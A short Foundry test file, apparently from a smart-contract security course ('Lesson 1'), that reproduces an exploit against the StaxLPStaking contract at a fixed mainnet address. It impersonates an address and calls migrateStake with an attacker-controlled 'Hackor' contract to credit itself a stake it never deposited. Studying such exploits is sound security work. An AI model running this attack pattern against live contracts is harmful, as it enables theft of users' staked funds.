// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Lesson 1 - StaxLPStaking.sol";

contract StaxLPStakingExploitTest is Test {
    StaxLPStaking public stax;
    Hackor public hackor;

    function setUp() public {
        // vm.roll(15725067);
        stax = StaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);
        hackor = new Hackor();
    }

    function testExecuteHack() public {
        vm.prank(address(3));
        stax.migrateStake(address(hackor), 1000000);
        console.log(stax.balanceOf(address(3)));
    }
}
